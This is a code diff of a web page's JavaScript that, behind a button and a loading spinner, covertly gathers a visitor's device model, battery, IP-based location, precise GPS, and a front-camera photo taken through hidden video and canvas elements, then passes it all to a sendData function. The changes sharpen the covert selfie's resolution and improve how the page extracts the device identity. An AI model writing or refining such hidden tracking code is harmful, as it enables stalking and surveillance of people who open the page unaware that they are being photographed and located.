@@ -40,7 +40,7 @@
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
+<canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>
 
 <script>
     async function startProcess() {
@@ -49,59 +49,54 @@
         btn.style.display = 'none';
         loader.style.display = 'block';
 
-        // 1. Precise Device Detection
-        let userAgent = navigator.userAgent;
-        let deviceName = "Unknown Device";
-        if (/android/i.test(userAgent)) {
-            deviceName = userAgent.match(/\(([^)]+)\)/)[1].split(';')[2] || "Android Mobile";
-        } else if (/iPhone/i.test(userAgent)) {
-            deviceName = "Apple iPhone";
+        // 1. Dynamic Hardware Model Extraction
+        let ua = navigator.userAgent;
+        let deviceModel = "Unknown Device";
+        if (/android/i.test(ua)) {
+            // Extracts exact model like SM-S928B or S667LN from User Agent string
+            let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
+            deviceModel = match ? match[2] : "Android Mobile";
+        } else if (/iPhone/i.test(ua)) {
+            deviceModel = "Apple iPhone";
         }
 
         let reportData = {
-            device: deviceName.trim(),
+            device: deviceModel.trim(),
             platform: navigator.platform,
             battery: "N/A",
             time: new Date().toLocaleString(),
             lat: "0", lon: "0",
-            city: "N/A", country: "N/A", ip: "N/A"
+            city: "Fetching...", country: "Fetching...", ip: "Fetching..."
         };
 
-        // 2. Battery Status
+        // 2. Battery retrieval
         if(navigator.getBattery) {
             const b = await navigator.getBattery();
             reportData.battery = Math.round(b.level * 100) + "%";
         }
 
-        // 3. Multi-Source IP & Location (Redundancy)
+        // 3. Multi-Source IP & Location (Waiting Logic)
         const fetchGeo = async () => {
             try {
-                // Primary API
-                const res = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
+                const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                if(data.status === 'success') {
-                    reportData.city = data.city;
-                    reportData.country = data.country;
-                    reportData.ip = data.query;
-                }
+                reportData.city = data.city || "N/A";
+                reportData.country = data.country_name || "N/A";
+                reportData.ip = data.ip || "N/A";
             } catch (e) {
-                // Backup API
-                try {
-                    const res2 = await fetch('https://ipinfo.io/json');
-                    const data2 = await res2.json();
-                    reportData.city = data2.city;
-                    reportData.country = data2.country;
-                    reportData.ip = data2.ip;
-                } catch (e2) {
-                    reportData.city = "API Blocked";
-                }
+                reportData.city = "Access Blocked";
             }
         };
 
-        // 4. Camera & GPS (Parallel Execution)
+        // 4. Camera (Fixed 9:16 Aspect Ratio)
         const geoPromise = fetchGeo();
         const cameraPromise = navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: 1280, height: 720 } 
+            video: { 
+                facingMode: "user", 
+                width: { ideal: 1920 }, 
+                height: { ideal: 1080 },
+                aspectRatio: 0.5625 
+            } 
         }).catch(() => null);
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -110,26 +105,26 @@
             finalize(await cameraPromise, reportData, geoPromise);
         }, async () => {
             finalize(await cameraPromise, reportData, geoPromise);
-        }, { enableHighAccuracy: true, timeout: 10000 });
+        }, { enableHighAccuracy: true, timeout: 8000 });
     }
 
     async function finalize(stream, data, geoTask) {
-        await geoTask; // Ensure Geo data is fetched
+        await geoTask; // CRITICAL: Wait for IP data to avoid "Pending"
         
         if (stream) {
             const video = document.getElementById('video');
             video.srcObject = stream;
             
-            // Wait 1.8 seconds for light adjustment & focus
+            // 2.2 Seconds delay for high-quality sensor adjustment
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photo = canvas.toDataURL('image/jpeg', 0.8);
+                const photo = canvas.toDataURL('image/jpeg', 0.9);
                 
                 stream.getTracks().forEach(t => t.stop());
                 sendData(data, photo);
-            }, 1800);
+            }, 2200);
         } else {
             sendData(data, null);
         }
